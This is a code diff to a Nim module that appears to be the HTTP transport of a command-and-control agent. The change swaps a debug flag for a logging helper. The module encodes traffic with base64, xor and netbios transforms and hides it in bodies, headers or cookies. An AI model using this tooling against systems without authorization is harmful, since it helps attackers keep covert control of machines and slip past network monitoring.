@@ -1,9 +1,6 @@
-## HTTPX Client - Handles raw_c2_config with transforms and message locations
-## Supports: base64, base64url, xor, prepend, append, netbios, netbiosu transforms
-## Supports: body, header, cookie message locations
-
 import std/[base64, strutils, json, tables, uri, sequtils]
 import http_client
+import ../utils/debug
 
 # Transform functions (client-side - encoding)
 proc transformBase64(data: seq[byte]): seq[byte] =
@@ -122,7 +119,7 @@ proc transformNetbiosuReverse(data: seq[byte]): seq[byte] =
     let right = data[i * 2 + 1] - 0x41
     result[i] = left or right
 
-proc applyClientTransforms(data: string, transforms: JsonNode, debug: bool): seq[byte] =
+proc applyClientTransforms(data: string, transforms: JsonNode): seq[byte] =
   ## Apply client transforms in order
   result = cast[seq[byte]](data)
   
@@ -136,8 +133,7 @@ proc applyClientTransforms(data: string, transforms: JsonNode, debug: bool): seq
     let action = transform["action"].getStr()
     let value = if transform.hasKey("value"): transform["value"].getStr() else: ""
     
-    if debug:
-      echo "[DEBUG] Applying client transform: ", action
+    debug "[DEBUG] Applying client transform: ", action
     
     case action
     of "base64":
@@ -155,10 +151,9 @@ proc applyClientTransforms(data: string, transforms: JsonNode, debug: bool): seq
     of "netbiosu":
       result = transformNetbiosu(result)
     else:
-      if debug:
-        echo "[DEBUG] Unknown transform: ", action
+      debug "[DEBUG] Unknown transform: ", action
 
-proc applyServerTransforms(data: seq[byte], transforms: JsonNode, debug: bool): seq[byte] =
+proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
   ## Apply server transforms in reverse order
   result = data
   
@@ -174,8 +169,7 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode, debug: bool): 
     let action = transform["action"].getStr()
     let value = if transform.hasKey("value"): transform["value"].getStr() else: ""
     
-    if debug:
-      echo "[DEBUG] Applying server transform (reverse): ", action
+    debug "[DEBUG] Applying server transform (reverse): ", action
     
     case action
     of "base64":
@@ -193,30 +187,27 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode, debug: bool): 
     of "netbiosu":
       result = transformNetbiosuReverse(result)
     else:
-      if debug:
-        echo "[DEBUG] Unknown server transform: ", action
+      debug "[DEBUG] Unknown server transform: ", action
 
-proc httpxPost*(url: string, body: string, postConfig: JsonNode, debug: bool): string =
+proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
   ## Make HTTP POST request using raw_c2_config with transforms and message locations
   
   var requestData = cast[seq[byte]](body)
   
   # Apply client transforms if present
   if postConfig.hasKey("client") and postConfig["client"].hasKey("transforms"):
-    requestData = applyClientTransforms(body, postConfig["client"]["transforms"], debug)
-    if debug:
-      echo "[DEBUG] Request data after transforms: ", requestData.len, " bytes"
+    requestData = applyClientTransforms(body, postConfig["client"]["transforms"])
+    debug "[DEBUG] Request data after transforms: ", requestData.len, " bytes"
   
   # Create HTTP client using our custom wrapper (WinHTTP on Windows, httpclient on Linux)
-  var client = newClientWrapper(debug)
+  var client = newClientWrapper()
   
   # Add client headers if present
   if postConfig.hasKey("client") and postConfig["client"].hasKey("headers"):
     let headers = postConfig["client"]["headers"]
     for key, val in headers.pairs:
       client.headers[key] = val.getStr()
-      if debug:
-        echo "[DEBUG] Request header: ", key, ": ", val.getStr()
+      debug "[DEBUG] Request header: ", key, ": ", val.getStr()
   
   # Prepare request based on message location
   var responseBody: string
@@ -231,29 +222,24 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, debug: bool): s
       # Add as cookie
       let cookieValue = name & "=" & cast[string](requestData)
       client.headers["Cookie"] = cookieValue
-      if debug:
-        echo "[DEBUG] Request location: cookie (", name, ")"
+      debug "[DEBUG] Request location: cookie (", name, ")"
       responseBody = client.postContent(url, "")
     
     of "header":
       # Add as header
       client.headers[name] = cast[string](requestData)
-      if debug:
-        echo "[DEBUG] Request location: header (", name, ")"
+      debug "[DEBUG] Request location: header (", name, ")"
       responseBody = client.postContent(url, "")
     
     else: # body or default
-      if debug:
-        echo "[DEBUG] Request location: body"
+      debug "[DEBUG] Request location: body"
       responseBody = client.postContent(url, cast[string](requestData))
   else:
     # Default: send as body
-    if debug:
-      echo "[DEBUG] Request location: body (default)"
+    debug "[DEBUG] Request location: body (default)"
     responseBody = client.postContent(url, cast[string](requestData))
   
-  if debug:
-    echo "[DEBUG] Response received: ", responseBody.len, " bytes"
+  debug "[DEBUG] Response received: ", responseBody.len, " bytes"
   
   # NOTE: Message locations for responses (cookie, header) are not currently supported
   # because our http_client wrapper only returns the body. This matches the HTTP profile
@@ -263,8 +249,7 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode, debug: bool): s
   
   # Apply server transforms if present
   if postConfig.hasKey("server") and postConfig["server"].hasKey("transforms"):
-    responseData = applyServerTransforms(responseData, postConfig["server"]["transforms"], debug)
-    if debug:
-      echo "[DEBUG] Response data after reverse transforms: ", responseData.len, " bytes"
+    responseData = applyServerTransforms(responseData, postConfig["server"]["transforms"])
+    debug "[DEBUG] Response data after reverse transforms: ", responseData.len, " bytes"
   
   result = cast[string](responseData)
